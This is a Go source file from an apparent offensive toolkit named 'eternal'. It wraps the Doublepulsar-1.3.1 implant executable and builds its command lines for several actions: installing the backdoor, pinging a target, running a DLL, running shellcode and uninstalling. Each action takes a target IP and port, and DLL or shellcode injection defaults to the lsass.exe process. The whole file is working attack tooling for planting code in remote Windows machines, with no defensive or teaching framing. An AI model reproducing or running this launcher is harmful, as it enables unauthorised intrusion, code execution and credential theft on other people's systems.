package exploits

import (
	"eternal/conf"
	"eternal/metatdatas"
	"eternal/utils"
	"fmt"
	"os/exec"
	"path/filepath"
)

func Doublepulsar() {
	var cmd *exec.Cmd
	metatdatas.MetaData.SetFunction()
	switch metatdatas.MetaData.Function {
	case "OutputInstall":
		metatdatas.MetaData.SetOutputInstall()
		metatdatas.MetaData.SetArch()
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--Architecture", metatdatas.MetaData.Arch, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--OutputFile", metatdatas.MetaData.OutputInstall)
	case "Ping":
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function)
	case "RunDLL":
		metatdatas.MetaData.SetDLLPath()
		ProcessName := SetProcessName()
		metatdatas.MetaData.SetArch()
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--Architecture", metatdatas.MetaData.Arch, "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--DllPayload", metatdatas.MetaData.DLLPath, "--ProcessName", ProcessName)
	case "RunShellcode":
		metatdatas.MetaData.SetDLLPath()
		ProcessName := SetProcessName()
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--ShellcodeFile", metatdatas.MetaData.DLLPath, "--ShellcodeData", metatdatas.MetaData.ShellcodeBuffer, "--ProcessName", ProcessName)
	case "Uninstall":
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function)
	}
	metatdatas.MetaData.ShowMetaData()
	utils.Execute(cmd)
}
func SetProcessName() string {
	ProcessName := ""
	fmt.Print(utils.ColorPrint(1, "Set ProcessName(default is lsass.exe):"))
	fmt.Scanf("%s", &ProcessName)
	if ProcessName == "" {
		ProcessName = "lsass.exe"
	}
	fmt.Println(utils.ColorPrint(0, "[+] Set ProcessName ==> "+ProcessName))
	return ProcessName
}
